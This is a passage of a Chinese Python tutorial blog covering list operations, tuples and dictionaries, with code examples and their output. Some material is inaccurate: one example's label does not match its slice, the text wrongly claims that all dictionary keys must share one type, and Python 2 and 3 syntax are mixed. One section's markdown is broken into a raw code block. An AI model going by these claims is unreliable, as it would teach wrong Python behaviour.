<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ]</span><br><span class="line"> </span><br><span class="line">print(list1[<span class="number">1</span>],list1[<span class="number">-2</span>])           //类似字符串一样使用索引</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;list1[0]: &quot;</span>, list1[<span class="number">0</span>])      //输出第一个元素</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;list2[1:5]: &quot;</span>, list2[<span class="number">1</span>:<span class="number">5</span>])  //输出索引为<span class="number">1</span>到（<span class="number">5</span><span class="number">-1</span>）的元素</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;list2[:4]: &quot;</span>, list2[<span class="number">1</span>:])    //前者输出从第<span class="number">1</span>个元素到索引为（<span class="number">4</span><span class="number">-1</span>）的元素</span><br><span class="line">                                    //后者输出索引为<span class="number">1</span>到最后一个元素</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">chemistry <span class="number">1997</span> </span><br><span class="line">list1[<span class="number">0</span>]:  physics </span><br><span class="line">list2[<span class="number">1</span>:<span class="number">5</span>]:  [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>] </span><br><span class="line">list2[:<span class="number">4</span>]:  [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>] </span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="三-更新列表"><a href="#三-更新列表" class="headerlink" title="三. 更新列表"></a><font color="#FF6347" face="Comic sans MS">三. 更新列表</font></h3><h4 id="3-1-处理元素"><a href="#3-1-处理元素" class="headerlink" title="3.1 处理元素"></a><font color="#3CB371" face="Comic sans MS">3.1 处理元素</font></h4><p>附加参考：<font color="#00B2EE">[<a href="https://www.cnblogs.com/wl404/p/7884665.html">列表使用大全</a>]</font> <font color="#00B2EE">[<a href="https://blog.csdn.net/viviliao_/article/details/79518219">Python3列表元素的修改</a>]</font> </p>
<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>1. 按索引来使用的方法</strong></font></p>
</blockquote>
<ol>
<li><font color="#FF7F00">append(‘String’)：</font> 将元素string追加到列表末尾，即把一个元素添加到堆栈顶；</li>
<li><font color="#FF7F00">pop(X)：</font> 删除列表中任何位置的元素，只需在括号中指定要删除的元素的索引即可。若果不指定则默认删除末尾的元素；</li>
<li><font color="#FF7F00">insert(X, “String”)：</font> 将元素String插入到索引为X的位置，原来元素从索引为X往后移；</li>
<li><font color="#FF7F00">del list[X]：</font> 删除列表list索引为X的元素；</li>
<li><font color="#FF7F00">len(list)：</font> 是个函数，统计列表list元素的个数，和在字符串中使用一样；</li>
<li>del和pop()的区别在于：del删除的元素不可以再继续使用了，但是pop()有个返回值，因为当作栈使用，它删除的元素还可以在其他地方继续使用；</li>
<li><font color="#FF7F00">reverse() ：</font> 按元素顺序倒转；</li>
<li><font color="#FF7F00">sort() ：</font> 是方法，对列表进行永久性排序，前提是列表中所有元素数据类型一样；</li>
<li><font color="#FF7F00">sorted() ：</font> 注意这是个函数，对列表进行临时排序，若列表中所有元素数据类型不一样会报错；</li>
</ol>
<blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>2. 按值来使用的方法</strong></font></p>
</blockquote>
<ol>
<li><font color="#FF7F00">**remove(“String”)**：</font> 删除列表中值为String的元素。注意：方法remove() 只删除第一个指定的值。如果要删除的值可能在列表中出现多次，就需要使用循环来判断是否删除了所有这样的值。</li>
</ol>
<br>

<p>下面示例代码（注意“//”不代表注释，仅仅为了展示）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ]</span><br><span class="line"></span><br><span class="line">list1.append(<span class="string">&#x27;Adam&#x27;</span>)      //append()</span><br><span class="line">print(list1)</span><br><span class="line"></span><br><span class="line">a = list2.pop(<span class="number">3</span>)          //pop()</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> list2[<span class="number">4</span>]              //<span class="keyword">del</span></span><br><span class="line">print(list2)</span><br><span class="line"></span><br><span class="line">list2.insert(<span class="number">3</span>,<span class="number">9</span>)         //insert()</span><br><span class="line">print(list2)</span><br><span class="line"></span><br><span class="line">print(len(list2))         //len()</span><br><span class="line"></span><br><span class="line">list1.remove(<span class="number">1997</span>)        //remove</span><br><span class="line">list1.remove(<span class="string">&quot;Adam&quot;</span>)</span><br><span class="line">print(list1)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>, <span class="string">&#x27;Adam&#x27;</span>] </span><br><span class="line"><span class="number">4</span> </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>] </span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">7</span>] </span><br><span class="line"><span class="number">6</span> </span><br><span class="line">[<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">2000</span>] </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line">s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line"></span><br><span class="line">print(s)                        //临时排序</span><br><span class="line">print(sorted(s))</span><br><span class="line">print(s);print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s.sort();print(s);print(<span class="string">&#x27;\n&#x27;</span>)   //永久排序 </span><br><span class="line"></span><br><span class="line">s.reverse();print(s)            //倒序</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line">[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;scheme&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>] </span><br></pre></td></tr></table></figure>


<br>

<br>

<h4 id="3-2-嵌套使用列表"><a href="#3-2-嵌套使用列表" class="headerlink" title="3.2 嵌套使用列表"></a><font color="#3CB371" face="Comic sans MS">3.2 嵌套使用列表</font></h4><br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>], <span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line">print(len(s))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">4</span> </span><br></pre></td></tr></table></figure>

<br>

<p>要注意s只有4个元素，其中s[2]又是一个list，如果拆开写就更容易理解了。<br>要拿到’php’可以写p[1]或者s[2][1]，因此s可以看成是一个二维数组，类似的还有三维、四维……数组，不过很少用到。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line">s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, p, <span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line">print(s)</span><br><span class="line">print(p[<span class="number">1</span>])</span><br><span class="line">print(s[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>], <span class="string">&#x27;scheme&#x27;</span>] </span><br><span class="line">php </span><br><span class="line">php </span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="四-列表常用的方法和函数"><a href="#四-列表常用的方法和函数" class="headerlink" title="四. 列表常用的方法和函数"></a><font color="#FF6347" face="Comic sans MS">四. 列表常用的方法和函数</font></h3><h4 id="4-1-列表操作符"><a href="#4-1-列表操作符" class="headerlink" title="4.1 列表操作符"></a><font color="#3CB371" face="Comic sans MS">4.1 列表操作符</font></h4><p>列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。<br>如下所示：</p>
<table>
<thead>
<tr>
<th align="left">Python表达式</th>
<th align="left">结果</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">len([1, 2, 3])</td>
<td align="left">3</td>
<td align="left">长度</td>
</tr>
<tr>
<td align="left">[1, 2, 3] + [4, 5, 6]</td>
<td align="left">[1, 2, 3, 4, 5, 6]</td>
<td align="left">组合</td>
</tr>
<tr>
<td align="left">[‘Hi!’] * 4</td>
<td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td>
<td align="left">重复</td>
</tr>
<tr>
<td align="left">3 in [1, 2, 3]</td>
<td align="left">True</td>
<td align="left">元素是否存在于列表中</td>
</tr>
<tr>
<td align="left">for x in [1, 2, 3]: print x,</td>
<td align="left">1 2 3</td>
<td align="left">迭代</td>
</tr>
</tbody></table>
<br>

<br>

<h4 id="4-2-列表函数-amp-方法"><a href="#4-2-列表函数-amp-方法" class="headerlink" title="4.2 列表函数&amp;方法"></a><font color="#3CB371" face="Comic sans MS">4.2 列表函数&amp;方法</font></h4><p>可查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-lists.html">Python列表函数&amp;方法</a>]</font></p>
<p>列表中Python包含以下函数:</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">cmp(list1, list2)<br>比较两个列表的元素</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">len(list)<br>列表元素个数</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">max(list)<br>返回列表元素最大值</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">min(list)<br>返回列表元素最小值</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">list(seq)<br>将元组转换为列表</td>
</tr>
</tbody></table>
<br>

<p>Python包含以下方法:</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">list.append(obj)<br>在列表末尾添加新的对象</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">list.count(obj)<br>统计某个元素在列表中出现的次数</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">list.extend(seq)<br>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">list.index(obj)<br>从列表中找出某个值第一个匹配项的索引位置</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">list.insert(index, obj)<br>将对象插入列表</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">list.pop([index=-1])<br>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">list.remove(obj)<br>移除列表中某个值的第一个匹配项</td>
</tr>
<tr>
<td align="center">8</td>
<td align="left">list.reverse()<br>反向列表中元素</td>
</tr>
<tr>
<td align="center">9</td>
<td align="left">list.sort(cmp=None, key=None, reverse=False)<br>对原列表进行排序</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="五-元组"><a href="#五-元组" class="headerlink" title="五. 元组"></a><font color="#FF6347" face="Comic sans MS">五. 元组</font></h3><blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>什么是元组tuple：</strong></font></p>
</blockquote>
<ol>
<li>Python的元组与列表类似，不同之处在于元组的元素不能修改。</li>
<li>元组使用小括号<code>()</code>，列表使用方括号<code>[]</code>。</li>
<li>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。</li>
<li>当括号中只有一个数字没有逗号时，既表示一个数字也可以便是一个元组，又可以表示数学公式中的小括号，这就产生了歧义。这种情况下，按小括号进行计算，计算结果自然是1。所以，只有1个元素的tuple定义时<font color="#FF7F00"><strong>必须加一个逗号</strong></font>。</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、定义元组</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tup1 = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> )</span><br><span class="line">tup3 = <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span></span><br></pre></td></tr></table></figure>

<br>

<p>创建空元组：<code>tup1 = ()</code></p>
<p>元组中只包含一个元素时，需要在元素后面添加逗号。<code>tup1 = (50,)</code></p>
<p>元组与字符串类似，下标索引从0开始，可以进行截取，组合等。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、使用元组</strong></font></p>
<ol>
<li>元组可以使用下标索引来访问元组中的值，如下：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tup1 = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> )</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;tup1[0]: &quot;</span>, tup1[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;tup2[1:5]: &quot;</span>, tup2[<span class="number">1</span>:<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"></span><br><span class="line">tup1[<span class="number">0</span>]:  physics</span><br><span class="line">tup2[<span class="number">1</span>:<span class="number">5</span>]:  (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>元组的值不允许修改，但是可以进行运算，比如连接用加号（+），重复用星号（*）。</p>
</li>
<li><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tup = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> tup</span><br><span class="line"><span class="keyword">del</span> tup</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;After deleting tup : &quot;</span></span><br><span class="line"><span class="keyword">print</span> tup</span><br></pre></td></tr></table></figure>

<p>以上实例元组被删除后，输出变量会有异常信息，输出如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">After deleting tup :</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">9</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">print</span> tup</span><br><span class="line">NameError: name <span class="string">&#x27;tup&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<br>

<ol start="4">
<li><font color="#FF7F00"><strong>最后来看一个“可变的”tuple：</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>])</span><br><span class="line">t[<span class="number">2</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span></span><br><span class="line">t[<span class="number">2</span>][<span class="number">1</span>] = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">print(t)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>]) </span><br><span class="line">```	</span><br><span class="line"></span><br><span class="line">这个tuple定义的时候有<span class="number">3</span>个元素，分别是<span class="string">&#x27;a&#x27;</span>，<span class="string">&#x27;b&#x27;</span>和一个list。不是说tuple一旦定义后就不可变了吗？怎么后来又变了？</span><br><span class="line">别急，我们先看看定义的时候tuple包含的<span class="number">3</span>个元素：</span><br><span class="line"></span><br><span class="line">![<span class="number">0.</span>png](https://i.loli.net/<span class="number">2019</span>/<span class="number">02</span>/<span class="number">28</span>/<span class="number">5</span>c77b1cc56635.png)</span><br><span class="line"></span><br><span class="line">当我们把list的元素<span class="string">&#x27;A&#x27;</span>和<span class="string">&#x27;B&#x27;</span>修改为<span class="string">&#x27;X&#x27;</span>和<span class="string">&#x27;Y&#x27;</span>后，tuple变为：</span><br><span class="line"></span><br><span class="line">![<span class="number">0</span> (<span class="number">1</span>).png](https://i.loli.net/<span class="number">2019</span>/<span class="number">02</span>/<span class="number">28</span>/<span class="number">5</span>c77b1f4c3628.png)</span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">表面上看，tuple的元素确实变了，但其实变的不是tuple的元素，而是list的元素。tuple一开始指向的list并没有改成别的list，所以，tuple所谓的“不变”是说，tuple的每个元素，指向永远不变。即指向<span class="string">&#x27;a&#x27;</span>，就不能改成指向<span class="string">&#x27;b&#x27;</span>，指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的！</span><br><span class="line"></span><br><span class="line">理解了“指向不变”后，要创建一个内容也不变的tuple怎么做？那就必须保证tuple的每一个元素本身也不能变。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;font color=&quot;#00B2EE&quot; face=&quot;Comic sans MS&quot;&gt;**三、元组运算符**&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。</span><br><span class="line"></span><br><span class="line">Python表达式|结果|描述|</span><br><span class="line">:-|:-|:-|	</span><br><span class="line">len((<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>))	         |<span class="number">3</span>	                            |计算元素个数</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) + (<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)	 |(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)	        |连接</span><br><span class="line">(<span class="string">&#x27;Hi!&#x27;</span>,) * <span class="number">4</span>	         |(<span class="string">&#x27;Hi!&#x27;</span>, <span class="string">&#x27;Hi!&#x27;</span>, <span class="string">&#x27;Hi!&#x27;</span>, <span class="string">&#x27;Hi!&#x27;</span>)	|复制</span><br><span class="line"><span class="number">3</span> <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)	         |<span class="literal">True</span>	                        |元素是否存在</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>): <span class="keyword">print</span> x,	  |<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>	            |迭代</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;font color=&quot;#00B2EE&quot; face=&quot;Comic sans MS&quot;&gt;**四、元组内置函数**&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">Python元组包含了以下内置函数</span><br><span class="line"></span><br><span class="line">序号|函数|</span><br><span class="line">:-:|:-|</span><br><span class="line"><span class="number">1</span>	|cmp(tuple1, tuple2)&lt;br&gt;比较两个元组元素。</span><br><span class="line"><span class="number">2</span>	|len(tuple)&lt;br&gt;计算元组元素个数。</span><br><span class="line"><span class="number">3</span>	|max(tuple)&lt;br&gt;返回元组中元素最大值。</span><br><span class="line"><span class="number">4</span>	|min(tuple)&lt;br&gt;返回元组中元素最小值。</span><br><span class="line"><span class="number">5</span>	|tuple(seq)&lt;br&gt;将列表转换为元组。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">### &lt;font color=&quot;#FF6347&quot; face=&quot;Comic sans MS&quot;&gt;六. 字典&lt;/font&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### &lt;font color=&quot;#3CB371&quot; face=&quot;Comic sans MS&quot;&gt;6.1 字典的定义&lt;/font&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;&lt;font color=&quot;#00B2EE&quot; face=&quot;Comic sans MS&quot;&gt;**关于字典dict：**&lt;/font&gt;</span><br><span class="line"><span class="number">1.</span> 字典是另一种可变容器模型，且可存储任意类型对象；</span><br><span class="line">2. 字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 &#123;&#125; 中；`d = &#123;key1 : value1, key2 : value2 &#125;`</span><br><span class="line"><span class="number">3.</span> 键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一；</span><br><span class="line"><span class="number">4.</span> 值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组；</span><br><span class="line"><span class="number">5.</span> 第一个键定义为什么数据类型，后面所有的键必须定义为相同的数据类型；</span><br><span class="line"><span class="number">6.</span> 访问字典里的值，把相应的键放入熟悉的方括弧即可，`dict[key]`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#### &lt;font color=&quot;#3CB371&quot; face=&quot;Comic sans MS&quot;&gt;6.2 字典的修改&lt;/font&gt;</span></span><br><span class="line"></span><br><span class="line">向字典添加新内容的方法是增加新的键/值对，修改或删除已有键/值对</span><br><span class="line"></span><br><span class="line">&lt;font color=&quot;#00B2EE&quot; face=&quot;Comic sans MS&quot;&gt;**一、添加键—值对、修改字典**&lt;/font&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;font color=&quot;#FF7F00&quot;&gt;**字典是一种动态结构，可随时在其中添加键—值对**&lt;/font&gt;。要添加键—值对，可依次指定字典名、用方括号括起的键和相关联的值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如下示例，我们先建立一个空字典，然后向里面添加元素（键值对）并修改：</span><br><span class="line">&lt;font color=&quot;#FF7F00&quot;&gt;&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">a=&#123;&#125;</span><br><span class="line">a[<span class="string">&#x27;color&#x27;</span>]=<span class="string">&#x27;green&#x27;</span></span><br><span class="line">a[<span class="string">&#x27;points&#x27;</span>]=<span class="number">5</span></span><br><span class="line">print(a[<span class="string">&#x27;color&#x27;</span>],a[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line"></span><br><span class="line">a[<span class="string">&#x27;color&#x27;</span>]=<span class="number">666</span></span><br><span class="line">print(a[<span class="string">&#x27;color&#x27;</span>],a[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">green <span class="number">5</span></span><br><span class="line"><span class="number">666</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>


<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、删除键—值对</strong></font></p>
<p>能删单一的元素也能清空字典，清空只需一项操作。</p>
<blockquote>
<p><font color="#FF7F00"><strong>删除字典可以使用del或者pop()。</strong></font></p>
</blockquote>
<ol>
<li><font color="#FF7F00"><strong>要删除一个key:</strong></font><ol>
<li>用pop(key)方法，对应的value也会从dict中删除</li>
<li>可使用del 语句将相应的键—值对彻底删除。使用del 语句时，必须指定字典名和要删除的键。<code>del dict[&#39;key&#39;]</code></li>
</ol>
</li>
<li><font color="#FF7F00"><strong>删除整个字典：</strong></font>del dict 则dict这个字典被删除了</li>
</ol>
<br>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">dict = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Zara&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> dict[<span class="string">&#x27;Name&#x27;</span>]  <span class="comment"># 删除键是&#x27;Name&#x27;的条目</span></span><br><span class="line">dict.pop(<span class="string">&#x27;Class&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(dict[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line">dict.clear()      <span class="comment"># 清空词典所有条目</span></span><br><span class="line"><span class="keyword">del</span> dict          <span class="comment"># 删除词典</span></span><br><span class="line">print(dict[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">7</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;1.py&quot;</span>, line <span class="number">11</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(dict[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line">TypeError: <span class="string">&#x27;type&#x27;</span> object <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br></pre></td></tr></table></figure>


<br>

<h4 id="6-3-字典的遍历"><a href="#6-3-字典的遍历" class="headerlink" title="6.3 字典的遍历"></a><font color="#3CB371" face="Comic sans MS">6.3 字典的遍历</font></h4><p><font color="#00B2EE" face="Comic sans MS"><strong>一、判断字典中</strong><font color="red"><strong>某个键</strong></font><strong>是否存在</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>方法：</strong></font></p>
</blockquote>
<ol>
<li>通过in判断key是否存在；</li>
<li>通过dict提供的get()方法，如果key不存在，可以返回None，或者返回自己指定的value。</li>
</ol>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">dict = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Zara&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line">a = <span class="string">&#x27;Name&#x27;</span> <span class="keyword">in</span> dict</span><br><span class="line">b = <span class="string">&#x27;Year&#x27;</span> <span class="keyword">in</span> dict</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">c = dict.get(<span class="string">&#x27;Name&#x27;</span>,<span class="string">&#x27;如果不存在，这里是返回信息&#x27;</span>)</span><br><span class="line">d = dict.get(<span class="string">&#x27;Year&#x27;</span>,<span class="string">&#x27;如果不存在，这里是返回信息&#x27;</span>)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">Zara</span><br><span class="line">如果不存在，这里是返回信息</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、遍历字典中的所有键</strong></font></p>
<p>在不需要使用字典中的值时，方法keys() 很有用。</p>
